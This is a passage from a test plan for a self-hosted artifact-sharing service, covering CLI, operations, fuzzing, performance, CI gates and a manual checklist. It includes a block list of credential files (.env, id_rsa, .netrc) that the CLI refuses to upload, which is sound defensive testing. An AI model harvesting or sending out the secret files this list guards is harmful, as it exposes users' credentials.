public, and that it tells the agent to supply `title` and `tags` because content is never
indexed. String assertions against Part 12's copy, so a copy change that drops the sentence
fails here. §9.3, §9.6.

**T-MCP-08 — `share_whoami`.** *Integration.* Returns handle, scopes, quota used and remaining,
and artifact count; for an agent-default token the scope rendering states plainly that it cannot
create share links. §9.3, §9.6.

**T-MCP-09 — MCP rejects the wrong credential class.** Cross-reference T-SEC-07. §4.7.

**T-MCP-10 — negative trio for `/mcp`.** *Integration.* Permission: `tok_ro` calling
`share_post` → `insufficient_scope`. Limit: tool calls count against the `api` bucket → a
`rate_limited` tool error carrying `detail.bucket`. Malformed: an unknown tool name, a missing
required argument, a wrong-typed argument, and a 20 MB argument payload → JSON-RPC errors, never
a `500` and never a partial write. §14.1.3.

## 14.17 T-CLI — the `share` binary

**T-CLI-01 — command parity.** *Integration.* Every command in §9.4 exists, and a coverage test
asserts each maps onto an API capability with no CLI-only or API-only gap. §9.1.1.

**T-CLI-02 — `share post` on a directory.** *Integration.* Posts a 3-file directory; output
matches §9.4.3's shape and **ends with the URL on its own line**, so `$(share post ./x | tail -1)`
is exactly the URL — asserted by running that shell expression. Warnings go to **stderr** with a
`warning:` prefix; the URL goes to stdout. §9.4.3.

**T-CLI-03 — `--json` contract.** *Integration.* `share post --json` emits **exactly** the commit
response body from §5.4 phase 3 on stdout and nothing else — no progress, no banner, no trailing
newline beyond one — and parses as JSON. Every command with `--json` emits either an API
response body or, on failure, **the §5.1.1 error envelope on stdout**, so a wrapper can branch on
`error.code` without scraping text. Assert this for at least one failure of each exit-code class.
§9.4.3, §9.7.

**T-CLI-04 — exit codes.** *Integration.* One case per code in §9.7: `0` success; `1` a generic
server-side failure; `2` an unknown flag; `3` no credentials file and no `SHARE_TOKEN`; `4` a
revoked token; `5` `share link` with `tok_agent`; `6` `share get missing`; `7` `name_taken`;
`8` quota exceeded; `9` `429`; `10` an unreachable host; `11` a refused secret file; `12` a
`500`. Each asserts the code **and** that `--json` carried the matching `error.code`. §9.7.

**T-CLI-05 — secret-file refusal.** *Integration.* A directory containing `.env`, `.env.local`,
`key.pem`, `server.key`, `id_rsa`, `bundle.p12`, `x.keystore`, `credentials`, and `.netrc`.
`share post ./dir` → **exit 11**, nothing uploaded, no network request made at all (asserted with
a request recorder), and stderr **naming each offending file**. With `--force-secrets` the walk
proceeds, and the server then rejects the dotfiles with `422 dotfile_rejected` — the test asserts
both layers, because the client rule is what catches the mistake and the server rule is the
backstop. §9.4.2, §6.4.

**T-CLI-06 — always-excluded paths.** *Integration.* A tree containing every entry in §9.4.2's
always-excluded list plus a real file. `--dry-run` prints a manifest containing only the real
file. `--include`/`--exclude` globs cannot re-include `.git/` or `node_modules/`. §9.4.2.

**T-CLI-07 — symlinks and unreadable files.** *Integration.* A symlink is **skipped with a
warning**, never followed (assert the target's bytes are absent from the manifest, including for
a symlink pointing inside the tree). An unreadable file is a **hard error** naming the file, exit
11, nothing posted. §9.4.2.

**T-CLI-08 — bundle-vs-three-phase selection.** *Integration.* A 10 MB / 50-file tree uses the
one-shot bundle path; a 40 MB / 50-file tree and a 10 MB / 300-file tree use the three-phase
path; `--bundle` and `--no-bundle` override both ways. Asserted from the request recorder.
§5.6.

**T-CLI-09 — `--dry-run` changes nothing.** *Integration.* Prints the manifest and what would
upload; zero write requests; zero rows; exit 0. §9.4.1.

**T-CLI-10 — credentials handling.** *Integration.* `share login` runs the device-code flow and
writes `~/.share/credentials` with mode **0600** containing one line, and prints the granted
scopes including, in words, that the token cannot create share links. Resolution order
flag → env → `./.share.json` → `~/.share/config.json` → default is asserted with all five set to
different hosts. `./.share.json` is excluded from any walk. `share logout` removes the file.
§9.5.

**T-CLI-11 — `sharectl`/`share` never print a token to a pipe.** *Integration.* With stdout not a
TTY, a command that would print a full token prints only the `display_prefix` and a note, unless
`--force` is passed. §4.10.

**T-CLI-12 — `share link` prints absolute expiry.** *Integration.* Output contains
`Public until 2026-09-07 18:04 UTC (14 days)` in absolute-plus-relative form, so an agent
transcript records exactly what became reachable and for how long. §9.6.

**T-CLI-13 — posting says "private".** *Integration.* `share post` output ends with
`Posted postcal v2 — private`; `share whoami` prints
`scopes: artifacts:read artifacts:write  (cannot create share links)` for an agent-default
token. §9.6.

**T-CLI-14 — CI behaviour.** *Integration.* With `SHARE_TOKEN` set and no credentials file, all
commands work. In a non-TTY without `--yes`, a command requiring confirmation is an **error**,
not a silent assumption. `share post ./out --name preview-x --ttl 30d` yields a private artifact
with a TTL. §9.9.

**T-CLI-15 — `share doctor`.** *Integration.* Reports connectivity, credential presence and
scopes, server version, and clock skew; with the client clock 10 minutes off it reports the skew
and warns that signed upload URLs may fail. §9.4.

**T-CLI-16 — negative trio for the CLI.** *Integration.* Permission: `share rm --purge` with
`tok_agent` → exit 5. Limit: posting into a `429` → exit 9 and a message naming the bucket.
Malformed: `share post` with no path → exit 2 and usage on stderr. §14.1.3.

## 14.18 T-OPS — install, operations, recovery

**T-OPS-01 — clean install.** *e2e.* From a fresh VM image, run the Part 15 install: systemd
units `share-api`, `share-worker`, `caddy`, `postgresql`, `redis` all active; Caddy obtains a
certificate via HTTP-01; `/internal/health` and `/internal/ready` are `200` **only from
loopback** and refused from outside; `/api/v1/status` requires a credential. §2.1, §2.8, §15.

**T-OPS-02 — startup preflight refuses a bad environment.** *Integration.* Each of: file root
not writable; **tmp root on a different device**; Postgres unreachable; Postgres at the wrong
migration revision; Redis unreachable; `SHARE_HOST` unresolvable; a missing required credential.
**Expect:** exit non-zero with exactly **one** diagnostic line naming the failed check, no
partial startup, and no listening socket. §2.7.

**T-OPS-03 — backup and restore round trip with integrity verification.** *e2e
`@commit_required`.*
- **Pre:** an instance with 3 users, 40 artifacts across every `kind`, 120 versions, 8 live
  links (2 with passwords), 5 grants, 12 trashed artifacts, a populated audit log, and view
  rollups.
- **Steps:** Run the nightly backup. Record a manifest of every blob's SHA-256, every table's row
  count, and a checksum over each table's ordered contents. Destroy the instance (drop the
  database, delete the file root). Restore from the backup onto a clean host. Re-run the
  manifest.
- **Expect:** row counts and table checksums identical; **every blob's recomputed SHA-256 equals
  its filename** (this is the integrity verification, and it is why content addressing is worth
  having); every artifact serves the same bytes at the same URL; every live share link still
  works, including the password links with their original passwords (argon2 hashes restored);
  every recipient session is **gone** (they lived in Postgres and are past their 24 h anyway —
  assert this rather than assuming); the audit log is complete; `sharectl recompute-quota`
  produces figures identical to the pre-destruction values. Also assert the backup is encrypted
  at rest and that restoring **without** the key fails cleanly. §15.4, §3.5.

**T-OPS-04 — backup failure is noticed.** *Integration.* Make the backup destination unwritable;
run the job. **Expect:** non-zero result, `system.backup` audited with a failure flag, and a
`backup_failed` email to the root user. §10.8.

**T-OPS-05 — collection never deletes a referenced file, even with a corrupted counter.**
Cross-reference T-VER-09, which is the authoritative case. This entry additionally runs a
**fuzz** variant: 500 random `ref_count` perturbations across a 200-file instance, each followed
by a collection run and a full reconciliation, asserting that **no file with a live
`version_file` row is ever removed from disk** in any iteration. §3.6.

**T-OPS-06 — `sharectl panic`.** *Integration.* With 12 live links across 3 users, 20 recipient
sessions, and 6 grants: run `sharectl panic`. **Expect:** every `share_link` row on the instance
has `revoked_at` set; every `recipient_session` is deleted; every `sh:tok:` and recipient cache
key purged; every previously-working link is `410` on its **next** request with the clock frozen;
**grants are untouched** (they are not a bearer credential — see §14.24 ambiguity A7); a
`system.panic` audit row; one summary email naming the counts. Artifacts, versions, files,
sessions, and API tokens are untouched, so the operator's own access survives. §10.5.

**T-OPS-07 — `sharectl recompute-quota` and `recompute-refs`.** *Integration.* Corrupt
`storage_bytes` and `artifact_count`; run `recompute-quota`; assert exact restoration including
the over-counting rule of §3.9 (a user is charged for every file their artifacts reference even
when another user references it too — assert the two users' figures **sum to more** than the disk
usage, deliberately). Corrupt `ref_count`; run `recompute-refs`; assert reconciliation. §3.9.

**T-OPS-08 — worker schedule.** *Integration.* Each of the eleven jobs in §2.6 exists, is
registered at its stated cadence, is individually invocable, is idempotent when run twice, and
logs a summary. A job raising an exception does not prevent the others from running. §2.6.

**T-OPS-09 — migrations.** *Integration.* `alembic upgrade head` on an empty database creates
every table in §3 in dependency order and adds the two forward-referencing foreign keys
afterwards; `citext` and `pg_trgm` exist; every index and constraint named in §3 is present
(asserted against `pg_indexes` and `pg_constraint`, not against the migration source).
`downgrade` to base and re-upgrade succeeds. A second `upgrade head` is a no-op. §3.1.

**T-OPS-10 — host security posture.** *e2e.* `/var/lib/share` is owned by `share`; blobs are
`0640` and readable by the `caddy` group; Postgres and Redis listen on loopback only; Redis
requires a password and `CONFIG` is renamed to the empty string (asserted by attempting
`CONFIG GET`); UFW permits only 22, 80, 443. §2.9.

**T-OPS-11 — restart mid-upload.** *Integration.* Restart `share-api` during a multi-file upload.
**Expect:** the in-flight `PUT` fails; already-completed files remain; `GET /uploads/{sid}`
returns the pending set with fresh URLs; the client resumes and commits successfully; no partial
blob is in `SHARE_FILE_ROOT` and no `.part` file is left in `SHARE_TMP_ROOT`. §N5, §5.4.

**T-OPS-12 — the test environment does not weaken production defaults.** *Unit.* As specified in
§14.2.2: diff the test `Settings` against `Settings()` and fail on any override not in that
table.

## 14.19 Property-based and fuzz targets

Hypothesis for properties, `atheris` for the byte-level fuzzers. Each target runs 10,000 cases
per commit and 1,000,000 nightly, with a persistent corpus committed to the repository. Any
crash, hang over 1 s, or unhandled exception is a build failure; a discovered failing input is
committed as a regression case with its own `T-` ID.

**F1 — `normalise_path(raw) -> str | Invalid`** (§6.4). Input: arbitrary Unicode strings, arbitrary
byte strings, and mutations of a corpus of real paths.
- *Never raises.* Every input yields a path or a typed rejection.
- *Idempotent.* `normalise(normalise(p)) == normalise(p)` for every accepted `p`.
- *Confinement.* For every accepted `p`, `os.path.realpath(os.path.join(ROOT, p[1:]))` starts
  with `ROOT + "/"`. This is the property that makes traversal structurally impossible rather
  than blacklisted.
- *Shape.* Every accepted output starts with `/`, has no trailing `/`, no empty segment, no `.`
  or `..` segment, ≤ 1,024 bytes, ≤ 32 segments, each segment ≤ 255 bytes, is NFC, and contains
  no `Cf` codepoint and no byte below `0x20`.
- *Single decode.* If `p` percent-decodes twice to a different string, `p` is rejected.
- *Agreement.* The serve-time and post-time normalisers are the **same function** — asserted by
  identity, then by differential fuzzing against a naive reference implementation to catch
  divergence.

**F2 — `validate_name(raw) -> str | Invalid` and `generate_name()`** (§5.3, §6.3).
- *Accepted names round-trip.* `validate(validate(n)) == validate(n)`.
- *Case.* `validate(n.upper()) == validate(n)` for every accepted `n`.
- *Regex agreement.* The Python validator and the Postgres `name_format` CHECK accept exactly the
  same set — differential fuzzing against a live database, 100,000 cases.
- *Reserved closure.* No accepted name's first segment is in the reserved list, begins with `~`,
  or would be captured by a Caddy route prefix (§14.24 A1).
- *Generator.* Every `generate_name()` output passes `validate_name` and is not reserved, over
  1,000,000 draws.
- *No traversal.* No accepted name, joined into a URL, normalises to a path outside its space.

**F3 — `resolve_longest_prefix(space, rest) -> (artifact, filepath)`** (§6.5.1).
- *Determinism.* Same inputs, same output, independent of insertion order — asserted by shuffling
  the artifact set between runs.
- *Maximality.* The returned artifact's name is the longest name in the space that is a prefix of
  `rest` on a **segment boundary**; a name that is a character-prefix but not a segment-prefix
  (`q3rep` vs `q3/report`) never matches.
- *Partition.* `artifact.name + filepath == rest` exactly, for every hit.
- *Bounded work.* At most 8 lookups regardless of path length, asserted by a query counter, even
  for a 32-segment path.
- *Space isolation.* For every artifact set spanning two spaces, resolution in space A never
  returns an artifact of space B — this is P7 as a property.

**F4 — `bucket_consume(bucket, subject, now) -> Allowed | Refused(retry_after)`** (§10.2).
- *Never negative.* Token count stays in `[0, burst]` under any interleaving of consumes and
  time advances, including time moving backwards (a clock adjustment must not mint tokens).
- *Rate bound.* Over any window `W`, allowed requests ≤ `burst + rate * W`, checked over random
  request/advance schedules.
- *Liveness.* After refusal, waiting `retry_after` always yields an allowance.
- *Subject isolation.* Consumption for subject A never changes B's state, over random subject
  sets.
- *Registry totality.* Every name in `BUCKETS` has a positive rate and burst and a defined
  subject extractor.

**F5 — `resolve_entry_path(manifest, explicit) -> str | None`** (§5.5).
- *Membership.* A non-`None` result is always a key of the manifest.
- *Precedence.* For every generated manifest, the result equals a reference implementation of
  §5.5's five rules — differential testing against the rules written out independently.
- *Stability.* Independent of manifest ordering (shuffle the input).
- *Single-file rule.* A one-file manifest always yields that file, for every file type.
- *Explicit-miss.* An `explicit` not in the manifest never causes a raise and always falls
  through to rules 2–5.

**F6 — archive extraction** (§5.6). `atheris` over tar and gzip bytes: never escapes the temp
directory (filesystem watcher assertion inside the fuzz loop), never exceeds 512 MB RSS, never
hangs over 5 s, always terminates with either a manifest or a typed rejection.

**F7 — the error envelope** (§5.1.1). Property: for every endpoint and every generated
malformed input, the response body validates against the envelope schema, `code` is drawn from
the union of the error tables in Parts 4–10, and no `message` or `detail` value contains a
filesystem path, a `shr_` token, a cookie value, or a SHA-256.

## 14.20 Performance targets

Measured on the §2.1 floor hardware — Linode 4 GB Shared, 2 vCPU — with a seeded instance of
10,000 artifacts, 30,000 versions, 250,000 files, and 5 GB of blobs. Every number is a CI gate at
the stated percentile with a 20% regression tolerance against the recorded baseline; nightly runs
record a trend. Load is generated by `k6` against the real Caddy, from the same host (so the
figures exclude WAN latency, deliberately).

| Target | Measured how | Budget |
| --- | --- | --- |
| `/internal/authorize`, warm cache | 20,000 requests to a mix of 200 artifacts, cache pre-warmed; measure the forward_auth subrequest alone via the API's own timing histogram | **p50 ≤ 3 ms, p99 ≤ 15 ms** (§2.4.1's stated target) |
| `/internal/authorize`, cold | `FLUSHDB` before each of 2,000 requests; two indexed queries expected | p50 ≤ 12 ms, p99 ≤ 40 ms |
| `can_view` in isolation | Unit benchmark, 1,000,000 calls | ≤ 2 µs mean |
| Post a 3-file artifact (110 KB) end to end | CLI wall-clock from process start to the URL line, over 100 runs, loopback | **p50 ≤ 400 ms, p99 ≤ 1.2 s** |
| Post 5,000 files (25 MB total) | Declare + 5,000 `PUT`s at concurrency 8 + commit; wall clock | **≤ 90 s p50**, with the commit transaction itself **≤ 3 s p99** |
| Declare with a 5,000-entry manifest | Server time for phase 1 alone | p99 ≤ 800 ms |
| Cold serve of a 20 KB HTML file | First request after `FLUSHDB`, TTFB at the Caddy socket | **p50 ≤ 25 ms, p99 ≤ 60 ms** |
| Warm serve of the same file | Steady state, 5,000 requests | **p50 ≤ 8 ms, p99 ≤ 25 ms** |
| Warm serve, 60-asset bundle page load | Browser `loadEventEnd` in headless Chromium | ≤ 900 ms p95 |
| 2 GB MP4 range request | `Range: bytes=1073741824-1074790400` (1 MB from the middle); TTFB and throughput | **TTFB p99 ≤ 40 ms**; sustained throughput ≥ 200 MB/s from page cache, ≥ disk sequential rate cold; seek-storm of 200 random ranges shows no TTFB degradation beyond 2× |
| Search at 10,000 artifacts | `?q=` over 500 varied trigram queries | **p50 ≤ 40 ms, p99 ≤ 150 ms** |
| Search with 4 filters + sort | Same corpus | p99 ≤ 250 ms |
| Artifact list, page 1 of 10,000 | `?limit=50` | p99 ≤ 60 ms |
| Version restore of a 40 MB / 200-file version | Wall clock | **≤ 1 s** (§8.2's "well under a second") |
| Share-link unlock (argon2id) | `POST /unlock`, correct password | 120 ms ≤ p50 ≤ 400 ms — a **floor** as well as a ceiling: too fast means the KDF parameters are wrong |
| Nightly collection over 250,000 files | Job wall clock | ≤ 120 s |
| Backup of 5 GB | Job wall clock | ≤ 15 min |
| Cold start to first served request | systemd start to a `200` | ≤ 8 s |

Two anti-targets are also asserted, because they catch design regressions rather than slow code:
**(a)** serving a file never issues more than **one** Redis round trip and **zero** Postgres
queries on a warm cache (statement counters); **(b)** listing 50 artifacts never issues more than
**4** queries regardless of how many links, grants, and tags they carry — an N+1 in the list
endpoint is a build failure, not a performance note.

## 14.21 Acceptance criteria by phase

**Part 16 does not exist at the time of writing.** The phases below are inferred from two
sources: the `Phase` column of `inventory.md`, which assigns each screen 1, 2, or 3, and the
document map in §1.11. A fourth phase is inferred for the work that has no screen and therefore
no row in the inventory — operations, collection, backup, anomaly detection, and the performance
gates. **When Part 16 is written, its phase definitions govern and this section is reconciled to
them**; the test IDs listed per phase should move with the features rather than the features
moving to match this list. Recorded per §1.9 as decision D-14-PHASE.

### Phase 1 — the core loop
*Post, address, serve, sign in, trash. Screens 11.1, 11.3, 11.5, 11.6, 11.7, 11.8, 11.15, 11.18,
11.19, 11.26, 11.27. Parts 2, 3, 5, 6, and the private half of 4.*

Gating IDs: T-SEC-00 · T-PRIV-01 · T-PRIV-02 · T-PRIV-05 · T-PRIV-07 · T-SEC-01 · T-SEC-02 ·
T-SEC-04 · T-SEC-05 · T-SEC-06 · T-SEC-09 · T-SEC-10 · T-SEC-11 · T-SEC-12 · T-SEC-13 ·
T-SEC-15 · T-SEC-16 · T-SEC-17 · T-SEC-18 · T-SEC-25 · T-SEC-26 · T-SEC-28 · T-SEC-29 ·
T-AUTH-01 · T-AUTH-02 · T-AUTH-03 · T-AUTH-04 · T-AUTH-05 · T-AUTH-06 · T-AUTH-07 · T-AUTH-08 ·
T-AUTH-09 · T-AUTH-11 · T-AUTH-12 · T-AUTH-16 · T-AUTH-18 · T-AUTH-19 · T-POST-01 … T-POST-24
(all) · T-SERVE-01 … T-SERVE-15 (all) · T-TRASH-01 · T-TRASH-02 · T-TRASH-03 · T-TRASH-06 ·
T-TRASH-07 · T-TRASH-09 · T-VER-08 · T-LIMIT-01 · T-LIMIT-02 · T-LIMIT-03 · T-LIMIT-04 ·
T-LIMIT-05 · T-LIMIT-06 · T-LIMIT-07 · T-LIMIT-15 · T-LIMIT-17 · T-LIMIT-20 · T-LIMIT-22 ·
T-AUDIT-01 · T-MCP-01 · T-MCP-02 · T-MCP-04 · T-MCP-08 · T-MCP-10 · T-CLI-01 … T-CLI-16 (all) ·
T-OPS-01 · T-OPS-02 · T-OPS-08 · T-OPS-09 · T-OPS-10 · T-OPS-11 · T-OPS-12 · F1 · F2 · F3 · F5 ·
F7.

**Phase 1 cannot ship without T-PRIV-01.** An instance that serves artifacts on a public
hostname before the indistinguishability property holds is the one failure this product cannot
recover from.

### Phase 2 — sharing and the human surface
*Links, passwords, expiry, grants-free sharing, versions, viewer, search. Screens 11.2, 11.9,
11.10, 11.11, 11.12, 11.13, 11.16, 11.17, 11.21. Parts 7, 8, and the recovery half of 4.*

Gating IDs: all of Phase 1, plus T-PRIV-03 · T-PRIV-04 · T-PRIV-06 · T-PRIV-09 · T-SEC-03 ·
T-SEC-07 · T-SEC-08 · T-SEC-14 · T-SEC-19 · T-SEC-21 · T-SEC-22 · T-SEC-23 · T-SEC-24 ·
T-SEC-27 · T-SEC-30 · T-AUTH-10 · T-AUTH-13 · T-AUTH-14 · T-AUTH-15 · T-SHARE-01 … T-SHARE-13
and T-SHARE-16 … T-SHARE-18 · T-EXP-01 … T-EXP-13 (all) · T-VER-01 … T-VER-12 (all) ·
T-TRASH-04 · T-TRASH-05 · T-SEARCH-01 … T-SEARCH-08 (all) · T-LIMIT-08 · T-LIMIT-10 ·
T-LIMIT-13 · T-LIMIT-14 · T-LIMIT-16 · T-LIMIT-18 · T-AUDIT-02 · T-AUDIT-04 · T-AUDIT-05 ·
T-AUDIT-06 · T-AUDIT-07 · T-AUDIT-08 · T-MCP-03 · T-MCP-05 · T-MCP-06 · T-MCP-07 · T-MCP-09 ·
F4 · F6.

**Phase 2 cannot ship without T-PRIV-04, T-PRIV-09, T-EXP-02, and T-SEC-07.** Those four are the
whole argument that handing out a link is safe.

### Phase 3 — multiple users
*Invites, grants, shared-with-me, audit, security overview, staleness, storage, users, status.
Screens 11.4, 11.14, 11.20, 11.22, 11.23, 11.24, 11.25, 11.28.*

Gating IDs: all of Phases 1–2, plus T-SEC-20 · T-AUTH-17 · T-SHARE-14 · T-SHARE-15 ·
T-POST-22 · T-SEARCH-05 · T-LIMIT-09 · T-LIMIT-11 · T-LIMIT-12 · T-LIMIT-23 · T-AUDIT-03 ·
T-AUDIT-10 · and a **re-run of T-PRIV-07 and T-SEC-16 with three users populated**, since a
single-user instance cannot exercise a space boundary at all.

### Phase 4 — operations and hardening
*No screens; the reason it is invisible in `inventory.md`. Backup and restore, collection,
retention, anomaly detection, panic, seals, and the performance gates.*

Gating IDs: all of Phases 1–3, plus T-PRIV-08 · T-VER-07 · T-VER-09 · T-VER-10 · T-LIMIT-19 ·
T-LIMIT-21 · T-AUDIT-09 · T-OPS-03 · T-OPS-04 · T-OPS-05 · T-OPS-06 · T-OPS-07 · every §14.20
performance target · and the nightly one-million-case runs of F1–F7.

### The release gate

An instance may be trusted with real client material only when **every** `T-PRIV-*` and
`T-SEC-*` case passes on the actual deployment target — not on a developer machine — and §14.23's
manual checklist is signed off with a date and a name.

## 14.22 CI pipeline

### 14.22.1 Stages

| # | Stage | Runs | Fails the build on |
| --- | --- | --- | --- |
| 0 | **Lint and static** | `ruff`, `mypy --strict`, the clock lint, the SQL-`now()` lint, the entropy lint, `bandit`, a dependency audit | any finding |
| 1 | **Unit** | All unit-level cases, `-n auto` | any failure; coverage below §14.22.3 |
| 2 | **Schema** | `alembic upgrade head`/`downgrade base`/`upgrade head`; index and constraint presence (T-OPS-09) | any drift between the migration output and Part 3 |
| 3 | **Integration** | Real Postgres + Redis + file root; the whole `T-*` integration set | any failure |
| 4 | **Reflection gates** | T-SEC-00 (negative trio per route), T-LIMIT-01 (bucket registry), T-AUDIT-01's completeness assertion, T-MCP-02 (API/MCP parity), T-CLI-01 | an uncovered route, bucket, action, or capability |
| 5 | **Security** | Every `@security` case at every level | **any failure, unconditionally** (§14.22.4) |
| 6 | **e2e** | Real Caddy, real TLS, headless Chromium | any failure |
| 7 | **Property/fuzz (short)** | F1–F7 at 10,000 cases each, plus the committed corpus | any crash or property violation |
| 8 | **Performance (smoke)** | The five bolded §14.20 targets at 10% of full load | a regression over 20% against the recorded baseline |
| 9 | **Package** | Build the CLI, build the deploy artefact | — |

Stages 0–7 run on every commit to every branch. Stage 8 runs on every commit to `main` and on
every pull request that touches `authorize`, `can_view`, resolution, or the serving path.

### 14.22.2 Per-commit versus nightly

**Per commit:** stages 0–7, plus stage 8 where triggered. Target under 12 minutes wall clock with
parallelism; if it exceeds 20 minutes the fix is more parallelism, never a reduced suite.

**Nightly:** the full performance suite of §14.20 on real target hardware; F1–F7 at 1,000,000
cases; the suite run twice under two different `--random-order-seed` values; a full
backup/restore round trip (T-OPS-03) against a fresh VM; a 24-hour soak posting and serving
continuously with the collection, expiry, trash, and prune jobs on their real cadences, asserting
zero reference-count drift (T-VER-08's reconciliation query at the end) and zero leaked `.part`
files; and a dependency vulnerability scan.

**Weekly:** the 2 GB video range-request suite and the 5,000-file posting target at full size.

### 14.22.3 Coverage thresholds

| Scope | Threshold |
| --- | --- |
| `authorize()` (§6.5) | **100% branch** |
| `can_view()` (§6.5) | **100% branch** — all four returns and every actor/artifact combination |
| `normalise_path()` (§6.4) | **100% branch** — every one of the seven rules' reject paths |
| `resolve_longest_prefix()` (§6.5.1) | **100% branch** |
| `resolve_entry_path()` (§5.5) | 100% branch |
| Scope enforcement (`require()`) | 100% branch |
| Rate-limit and quota modules | 95% branch |
| Everything else | 85% line, 75% branch |

Branch coverage on the four bolded functions is enforced with **no exclusion pragmas permitted**
— a `# pragma: no cover` anywhere in those functions fails stage 0. Coverage may not decrease
between commits on `main`.

### 14.22.4 The security rule

1. **A failing `@security` test blocks the merge.** There is no override, no "known failure"
   list, no `xfail`, and no branch exemption. A security test that must change because the design
   changed is changed in the same commit as the design, with the reason in the commit message.
2. **An unrun security test is a failed security test.** Stage 5 records the count of collected
   `@security` cases and compares it to a checked-in expected count. A drop — from a collection
   error, a skipped module, a broken import, an accidental `-k` filter, or an environment that
   could not start — fails the stage with the same severity as an assertion failure. "The
   security suite did not run" is never a green build.
3. **A security test may not be deleted without deleting the feature it protects.** Removing a
   `@security` case requires a matching removal in the route table or the spec, verified by
   stage 4's reflection gates.
4. **The nine `T-PRIV-*` cases are additionally pinned by ID.** Stage 5 asserts all nine node IDs
   were collected and passed. Renaming one to something not matching `T-PRIV-0[1-9]` fails.
5. Flakiness policy: a non-security test that flakes is quarantined for at most 5 working days
   with an owner and an issue, then fixed or deleted. **A security test may never be
   quarantined**; a flaky one is treated as a live defect in the system under test until proven
   otherwise, because the failure mode of a flaky authorisation check is an intermittently open
   door.

## 14.23 Manual verification checklist

Automated tests cover the machine. This is the short list a human confirms **once**, on the real
instance, before the first piece of real client material goes near it. Sign and date it in
`DECISIONS.md`.

1. **The door is where you think it is.** From a phone on cellular data, with no VPN, open
   `https://share.c52.com/` and confirm you are asked to sign in. Then open a known artifact URL
   while signed out and confirm you get a plain not-found page, not a login prompt and not a
   "you don't have access" message.
2. **A passkey actually signs you in on a second device.** Not the machine you registered on. If
   this does not work, you have one credential and no recovery path.
3. **Two passkeys exist, and the recovery code is somewhere that is not this machine.** Print it
   or put it in a different vault. Confirm the first-run checklist shows complete.
4. **Send yourself a share link from a different network.** Open it in a private window on a
   device that has never signed in. Confirm the artifact renders, images and stylesheets load,
   and the URL bar shows `/s/…` and never your artifact's name.
5. **Password-gate a link and read the password aloud to someone.** If the generated password is
   ambiguous over the phone, that is a copy bug worth finding now.
6. **Revoke that link while the other person has it open, then have them reload.** They should see
   the "no longer active" page immediately. This is P9 with a human on the other end.
7. **Check your inbox.** Creating the link should have emailed you. If it did not, notifications
   are misconfigured and you will not learn when an agent shares something.
8. **Give an agent a token and ask it to share something.** It must fail, and it must tell you
   exactly which scope it lacks. Confirm the failure message is one you would understand at
   11 p.m.
9. **Post from the agent, then overwrite it, then roll back.** Confirm the URL never changed and
   the old version is still there.
10. **Delete something and get it back.** Then confirm its share links did *not* come back.
11. **Look at the audit log for the last hour** and confirm you can answer, from it alone, "what
    of mine became reachable without a sign-in today, and who did it".
12. **Watch a video artifact and scrub it.** Seeking must be instant. If it is not, `Range` is not
    reaching Caddy.
13. **Pull the plug.** Reboot the server. Confirm everything comes back without intervention and
    a certificate renewal is not pending.
14. **Restore last night's backup onto a scratch host** and open one artifact from it. A backup
    you have never restored is a hypothesis.
15. **Confirm disk encryption is actually on**, and that the backup destination is not on the same
    machine.
16. **Search for a phrase you know is inside a document you posted.** It must not be found. That
    is P5, and it is the thing you are trading for.

## 14.24 Spec ambiguities found while writing these tests

Recorded per §1.9. Each entry states the conflict with section numbers, the rule applied, and the
resolution the tests encode. All are logged in `DECISIONS.md` as `D-14-nn`.

**A1 — `handle /mcp*` swallows artifact names beginning `mcp`.** §6.3 reserves the exact name
`mcp`, but the Caddyfile in §2.4 routes `/mcp*` as a prefix, so an artifact legitimately named
`mcpserver` or `mcp-notes` would be proxied to the MCP endpoint and never resolve — a name the
API accepted at post time silently 404s at serve time. *Rules 2 and 3.* **Resolution:** the
Caddyfile route becomes `handle /mcp` plus `handle /mcp/*`; `/mcp*` is removed. The reserved list
in §6.3 is unchanged. F2 asserts no accepted name is captured by any Caddy route prefix, so this
class of bug cannot return when a route is added. Tested by T-POST-15 and T-SERVE-02.

**A2 — which URL is canonical in an API response.** §6.2 says `/~robert/postcal` is canonical and
that both forms resolve for the root user; §5.4 and §5.8 show `url` as the short form; §7.7 says
a grantee reaches the artifact "at its canonical URL". Unspecified: what `url` contains when the
artifact is returned to someone other than its owner. *Rule 1.* **Resolution:** `url` is the
short form only when the recipient of the response **is** the owning root user; in every other
response — grantee listings, `?shared=true`, MCP results for another user's artifact — it is the
`~handle` form. A recipient viewing through a link never receives a `url` field at all. Tested by
T-SHARE-14 and T-SERVE-02.

**A3 — an `entryPath` that is not in the manifest.** §5.4's field table and §5.5 rule 1 both
assume the explicit path exists; neither says what happens otherwise, and §5.12 has no code for
it. §5.9 has the same gap for `PATCH`. *Rules 1 and 2.* **Resolution:** asymmetric, and
deliberately so. At **post** time it falls through to rules 2–5 and returns an
`entry_path_not_found` **warning** — a post must not fail on a metadata nicety when the response
already carries a `warnings` array. At **`PATCH`** time it is `422 invalid_entry_path`, a new
code added to §5.12, because the caller is being explicit and synchronous and there is no
warnings channel. Tested by T-POST-14 and T-POST-23.

**A4 — `maxViews` counts something that is only estimated.** §7.3 defines `maxViews` as "burn
after N distinct viewer-days", but the only distinct-viewer machinery in the system is the
HyperLogLog of §3.8/§10.6, which is an **estimate**, and §3.7 gives `share_link` a `view_count`
column with no stated unit. Burning a capability on an approximation is not acceptable. *Rules 1
and 3.* **Resolution:** two separate quantities. `share_link.view_count` is defined as the count
of **authorised artifact responses** served through that link, for display only. A new exact
integer `share_link.viewer_days` counts distinct `(day, viewer_hash)` pairs, maintained via a
Redis set per link-day and folded into the column at the 60-second flush; `maxViews` compares
against that. The HLL remains for the owner-facing viewer estimate and is never used for
enforcement. Tested by T-SHARE-13.

**A5 — "live" is used in three places with two meanings.** §7.8 derives `shared` from "at least
one live link"; §7.5 says enforcement is the inline `expires_at` check while `revoked_at` lags up
to five minutes; §6.5's `can_view` calls `actor.link.live()` without defining it. *Rule 1.*
**Resolution:** one definition everywhere — a link is live iff `revoked_at IS NULL AND
expires_at > clock.now()`. A grant is live iff `revoked_at IS NULL`. Derived `visibility` uses
the same predicate, so an expired-but-unswept link reads as `private`, not `shared`. Tested by
T-SHARE-16 and T-EXP-02.

**A6 — `seq` is assigned at declare but constrained at commit.** §5.4 phase 1 returns `seq: 2` in
the declare response, while §3.4 enforces `UNIQUE (artifact_id, seq)` on rows that only appear at
commit. Two concurrent declares against one artifact both compute `seq: 2`, and the second commit
raises a constraint violation that has no error code in §5.12 — a `500`. *Rule 2.* **Resolution:**
`seq` is assigned **at commit**, inside the transaction, as `max(seq) + 1` under a row lock on the
artifact. The declare response's `seq` is documented as provisional and the commit response's is
